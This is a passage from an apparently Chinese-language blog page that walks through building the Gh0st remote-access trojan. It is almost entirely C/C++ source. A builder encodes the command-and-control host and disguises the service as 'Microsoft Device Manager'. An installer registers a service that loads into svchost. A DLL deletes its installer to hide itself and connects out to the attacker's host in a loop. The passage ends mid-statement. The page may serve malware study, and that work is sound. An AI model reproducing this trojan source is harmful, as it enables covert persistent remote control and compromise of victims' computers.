class="number">6</span>];</span><br><span class="line">		p[<span class="number">3</span>] = base64[(c &amp; <span class="number">0x0000003f</span>) &gt;&gt; <span class="number">0</span>];</span><br><span class="line">		<span class="keyword">if</span> (i &gt; size)</span><br><span class="line">			p[<span class="number">3</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (i &gt; size + <span class="number">1</span>)</span><br><span class="line">			p[<span class="number">2</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">		p += <span class="number">4</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*p = <span class="number">0</span>;</span><br><span class="line">	*str = s;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">MyEncode</span><span class="params">(<span class="type">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>		i, len;</span><br><span class="line">	<span class="type">char</span>* p;</span><br><span class="line">	<span class="type">char</span>* s, * data;</span><br><span class="line">	len = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line">	s = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">	<span class="built_in">memcpy</span>(s, str, len);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i] ^= <span class="number">0x19</span>;</span><br><span class="line">		s[i] += <span class="number">0x86</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">base64_encode</span>(s, len, &amp;data);</span><br><span class="line">	<span class="built_in">free</span>(s);</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_strstr</span><span class="params">(<span class="type">char</span>* a1, <span class="type">char</span>* a2, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">		a1[i] = a2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="type">int</span> enablehttp = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> InputStr[<span class="number">100</span>];	<span class="comment">//ç«¯å£åŸŸå</span></span><br><span class="line">	<span class="type">char</span>* EnInputStr;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, InputStr);</span><br><span class="line">	<span class="comment">//printf(&quot;%s&quot;, MyEncode(InputStr));</span></span><br><span class="line">	EnInputStr = <span class="built_in">MyEncode</span>(InputStr);</span><br><span class="line">	<span class="type">char</span> strServiceConfig[<span class="number">100</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> DisplayName[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">sprintf_s</span>(DisplayName, <span class="string">&quot;Microsoft Device Manager_%02x&quot;</span>, <span class="built_in">rand</span>() % <span class="number">0xff</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> Description[] = <span class="string">&quot;ç›‘æµ‹å’Œç›‘è§†æ–°ç¡¬ä»¶è®¾å¤‡å¹¶è‡ªåŠ¨æ›´æ–°è®¾å¤‡é©±åŠ¨&quot;</span>;</span><br><span class="line">	<span class="built_in">sprintf_s</span>(strServiceConfig, <span class="string">&quot;%s|%s&quot;</span>, <span class="built_in">MyEncode</span>(DisplayName),<span class="built_in">MyEncode</span>(Description));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> str1[<span class="number">100</span>] = <span class="string">&quot;CCCCCC&quot;</span>;</span><br><span class="line">	<span class="built_in">strcat</span>(str1, strServiceConfig);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> str2[<span class="number">100</span>] = <span class="string">&quot;AAAAAA&quot;</span>;</span><br><span class="line">	<span class="built_in">strcat</span>(str2, EnInputStr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="type">char</span>* pfile = <span class="literal">NULL</span>;</span><br><span class="line">		FILE* pf = <span class="literal">NULL</span>;</span><br><span class="line">		ULONG_PTR size;</span><br><span class="line">		ULONG_PTR read_size;</span><br><span class="line">		<span class="built_in">fopen_s</span>(&amp;pf, <span class="string">&quot;E:\\study\\Trojan\\Gh0st-vs2019--main\\Gh0st-vs2019--main\\gh0st-vs2019\\gh0st\\res\\install.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (pf == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: fopen wrong&quot;</span>;</span><br><span class="line">		<span class="built_in">fseek</span>(pf, <span class="number">0</span>, SEEK_END);</span><br><span class="line">		size = <span class="built_in">ftell</span>(pf);</span><br><span class="line">		<span class="built_in">fseek</span>(pf, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">		pfile = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">		<span class="keyword">if</span> (pfile == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: malloc wrong&quot;</span>;</span><br><span class="line">		read_size = <span class="built_in">fread</span>(pfile, <span class="built_in">sizeof</span>(<span class="type">char</span>), size, pf);</span><br><span class="line">		<span class="keyword">if</span> (read_size != size) <span class="keyword">throw</span> <span class="string">&quot;[-]: fread wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span> pathname[<span class="number">200</span>];</span><br><span class="line">		<span class="built_in">sprintf_s</span>(pathname, <span class="string">&quot;E:\\study\\Trojan\\Gh0st-vs2019--main\\Gh0st-vs2019--main\\gh0st-vs2019\\gh0st\\Release\\server\\server_%02x.exe&quot;</span>, <span class="built_in">rand</span>() % <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">fclose</span>(pf);</span><br><span class="line">		pf = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">fopen_s</span>(&amp;pf, pathname, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (pf == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: fopen wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">fwrite</span>(pfile, <span class="number">1</span>, size, pf);</span><br><span class="line">		<span class="built_in">fwrite</span>(str1, <span class="number">1</span>, <span class="built_in">strlen</span>(str1) + <span class="number">1</span>, pf);</span><br><span class="line">		<span class="built_in">fwrite</span>(str2, <span class="number">1</span>, <span class="built_in">strlen</span>(str2) + <span class="number">1</span>, pf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">catch</span> (<span class="type">const</span> <span class="type">char</span>* msg)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">		DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x&quot;</span>, err);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">catch</span>(...)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MSc7y">æœåŠ¡ç«¯éƒ¨åˆ†</h3>
<h4 id="thIjT">install</h4>
installçš„æ¨¡æ¿



<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__declspec(noinline)</span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// è®©å¯åŠ¨ç¨‹åºæ—¶çš„å°æ¼æ–—é©¬ä¸Šæ¶ˆå¤±</span></span><br><span class="line">	<span class="built_in">GetInputState</span>();</span><br><span class="line">	<span class="built_in">PostThreadMessage</span>(<span class="built_in">GetCurrentThreadId</span>(),<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	MSG	msg;</span><br><span class="line">	<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="type">char</span>	*lpEncodeString = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpServiceConfig = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpServiceDisplayName = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpServiceDescription = <span class="literal">NULL</span>;</span><br><span class="line">	lpEncodeString = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(hInstance, <span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpEncodeString == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in FindConfigStringAAAAAA&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lpServiceConfig = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(hInstance, <span class="string">&quot;CCCCCC&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpServiceConfig == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in FindConfigStringCCCCCC&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span>* pos = <span class="built_in">strchr</span>(lpServiceConfig, <span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pos == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in pos&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*pos = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	lpEncodeString = <span class="built_in">MyDecode</span>(lpEncodeString + <span class="number">6</span>);</span><br><span class="line">	lpServiceDisplayName = <span class="built_in">MyDecode</span>(lpServiceConfig + <span class="number">6</span>);</span><br><span class="line">	lpServiceDescription = <span class="built_in">MyDecode</span>(pos + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpServiceDisplayName == <span class="literal">NULL</span> || lpServiceDescription == <span class="literal">NULL</span> || lpEncodeString == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in MyDecode&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>	*lpServiceName = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpUpdateArgs = <span class="string">&quot;Gh0st Update&quot;</span>;</span><br><span class="line">	<span class="comment">// è¡¥ä¸:è¿™é‡Œæ˜¯çœ‹æ–‡ä»¶åå­—æœ‰æ²¡æœ‰æ›´æ–°(åœ¨inié…ç½®ä¸­æ–‡ä»¶å®šæ­»çš„)</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="built_in">GetCommandLine</span>(), lpUpdateArgs) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		HANDLE	hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, <span class="literal">true</span>, lpEncodeString);</span><br><span class="line">		DWORD	dwLastError = <span class="built_in">GetLastError</span>();</span><br><span class="line">		<span class="comment">// æ™®é€šæƒé™è®¿é—®ç³»ç»Ÿæƒé™åˆ›å»ºçš„Mutex,å¦‚æœå­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±è¿”å›æ‹’ç»è®¿é—®çš„é”™è¯¯</span></span><br><span class="line">		<span class="comment">// å·²ç»å®‰è£…è¿‡ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·é…ç½®çš„ï¼Œå°±ä¸å®‰è£…äº†</span></span><br><span class="line">		<span class="keyword">if</span> (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		<span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// ç­‰å¾…æœåŠ¡ç«¯è‡ªåˆ é™¤</span></span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è®¾ç½®å¼‚å¸¸å¤„ç†</span></span><br><span class="line">	<span class="built_in">SetUnhandledExceptionFilter</span>(bad_exception);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ç¡®ä¿æƒé™</span></span><br><span class="line">	<span class="built_in">SetAccessRights</span>();		<span class="comment">//è¿™é‡Œææƒæ˜¾ç¤ºæˆåŠŸï¼Œä½†æ˜¯åœ¨åç»­OpenSCManagerä¸­ä»ç„¶å­˜åœ¨æƒé™ä¸è¶³æç¤º</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åŠ è½½dllåˆ°svchostæœåŠ¡ä¸­ è¿™é‡Œæœ‰é”™è¯¯ï¼Œæ˜æ˜æ˜¯åˆ›å»ºçš„æ–°æœåŠ¡å´æ˜¾ç¤ºæœåŠ¡å·²å­˜åœ¨</span></span><br><span class="line">	lpServiceName = <span class="built_in">InstallService</span>(lpServiceDisplayName, lpServiceDescription, lpEncodeString);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lpServiceName != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// å†™å®‰è£…ç¨‹åºè·¯å¾„åˆ°æ³¨å†Œè¡¨ï¼ŒæœåŠ¡å¼€å§‹åè¯»å–å¹¶åˆ é™¤</span></span><br><span class="line">		<span class="type">char</span>	strSelf[MAX_PATH];</span><br><span class="line">		<span class="type">char</span>	strSubKey[<span class="number">1024</span>];</span><br><span class="line">		<span class="built_in">memset</span>(strSelf, <span class="number">0</span>, <span class="built_in">sizeof</span>(strSelf));</span><br><span class="line">		<span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, strSelf, <span class="built_in">sizeof</span>(strSelf));</span><br><span class="line">		<span class="built_in">wsprintf</span>(strSubKey, <span class="string">&quot;SYSTEM\\CurrentControlSet\\Services\\%s&quot;</span>, lpServiceName);</span><br><span class="line">		<span class="built_in">WriteRegEx</span>(HKEY_LOCAL_MACHINE, strSubKey, <span class="string">&quot;InstallModule&quot;</span>, REG_SZ, strSelf, <span class="built_in">lstrlen</span>(strSelf), <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//è½¬æ¥dll</span></span><br><span class="line">		<span class="built_in">StartService</span>(lpServiceName);</span><br><span class="line">		<span class="keyword">delete</span> lpServiceName;</span><br><span class="line">		<span class="keyword">delete</span> lpServiceDisplayName;</span><br><span class="line">		<span class="keyword">delete</span> lpServiceDescription;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="kGzUH">svchost</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">main</span><span class="params">(<span class="type">char</span> *lpServiceName)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">endif</span></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _CONSOLE</span></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Usage:\n %s &lt;Host&gt; &lt;Port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// lpServiceName,åœ¨ServiceMainè¿”å›åå°±æ²¡æœ‰äº†</span></span><br><span class="line">	<span class="type">char</span>	strServiceName[<span class="number">256</span>];</span><br><span class="line">	<span class="type">char</span>	strKillEvent[<span class="number">50</span>];</span><br><span class="line">	HANDLE	hInstallMutex = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line">	<span class="type">char</span>	*lpURL = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(CKeyboardManager::g_hInstance, <span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpURL == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">	<span class="comment">// Set Window Station</span></span><br><span class="line">	HWINSTA hOldStation = <span class="built_in">GetProcessWindowStation</span>();</span><br><span class="line">	HWINSTA hWinSta = <span class="built_in">OpenWindowStation</span>(<span class="string">&quot;winsta0&quot;</span>, FALSE, MAXIMUM_ALLOWED);</span><br><span class="line">	<span class="keyword">if</span> (hWinSta != <span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">SetProcessWindowStation</span>(hWinSta);</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">//////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CKeyboardManager::g_hInstance != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">SetUnhandledExceptionFilter</span>(bad_exception);</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">lstrcpy</span>(strServiceName, lpServiceName);</span><br><span class="line">		<span class="built_in">wsprintf</span>(strKillEvent, <span class="string">&quot;Global\\Gh0st %d&quot;</span>, <span class="built_in">GetTickCount</span>()); <span class="comment">// éšæœºäº‹ä»¶å</span></span><br><span class="line"></span><br><span class="line">		hInstallMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, <span class="literal">true</span>, lpURL);</span><br><span class="line">		<span class="built_in">ReConfigService</span>(strServiceName);</span><br><span class="line">		<span class="comment">// åˆ é™¤å®‰è£…æ–‡ä»¶ å®ç°è‡ªéšè—</span></span><br><span class="line">		<span class="built_in">DeleteInstallFile</span>(lpServiceName);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// å‘Šè¯‰æ“ä½œç³»ç»Ÿ:å¦‚æœæ²¡æœ‰æ‰¾åˆ°CD/floppy disc,ä¸è¦å¼¹çª—å£å“äºº</span></span><br><span class="line">	<span class="built_in">SetErrorMode</span>( SEM_FAILCRITICALERRORS);</span><br><span class="line">	<span class="type">char</span>	*lpszHost = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD	dwPort = <span class="number">80</span>;</span><br><span class="line">	<span class="type">char</span>	*lpszProxyHost = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD	dwProxyPort = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span>	*lpszProxyUser = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpszProxyPass = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE	hEvent = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	CClientSocket socketClient;</span><br><span class="line">	BYTE	bBreakError = NOT_CONNECT; <span class="comment">// æ–­å¼€è¿æ¥çš„åŸå› ,åˆå§‹åŒ–ä¸ºè¿˜æ²¡æœ‰è¿æ¥</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (bBreakError != NOT_CONNECT &amp;&amp; bBreakError != HEARTBEATTIMEOUT_ERROR)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				hEvent = <span class="built_in">OpenEvent</span>(EVENT_ALL_ACCESS, <span class="literal">false</span>, strKillEvent);</span><br><span class="line">				<span class="keyword">if</span> (hEvent != <span class="literal">NULL</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					socketClient.<span class="built_in">Disconnect</span>();</span><br><span class="line">					<span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">					</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">Sleep</span>(<span class="number">60</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line">		<span class="comment">// ä¸Šçº¿é—´éš”ä¸º2åˆ†, å‰6ä¸ª&#x27;A&#x27;æ˜¯æ ‡å¿—</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">getLoginInfo</span>(<span class="built_in">MyDecode</span>(lpURL + <span class="number">6</span>), &amp;lpszHost, &amp;dwPort, &amp;lpszProxyHost, </span><br><span class="line">				&amp;dwProxyPort, &amp;lpszProxyUser, &amp;lpszProxyPass))</span><br><span class="line">		&#123;</span><br><span class="line">			bBreakError = GETLOGINFO_ERROR;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		lpszHost = argv[<span class="number">1</span>];</span><br><span class="line">		dwPort = <span class="built_in">atoi</span>(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">if</span> (lpszProxyHost != <span class="literal">NULL</span>)</span><br><span class="line">			socketClient.<span class="built_in">setGlobalProxyOption</span>(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			socketClient.<span class="built_in">setGlobalProxyOption</span>();</span><br><span class="line"></span><br><span class="line">		DWORD dwTickCount = <span class="built_in">GetTickCount</span>();</span><br><span class="line">        <span class="comment">//è¿æ¥</span></span><br><span class="line"> 		<span class="keyword">if</span> (!socketClient.<span class="built_in">Connect</span>(lpszHost, 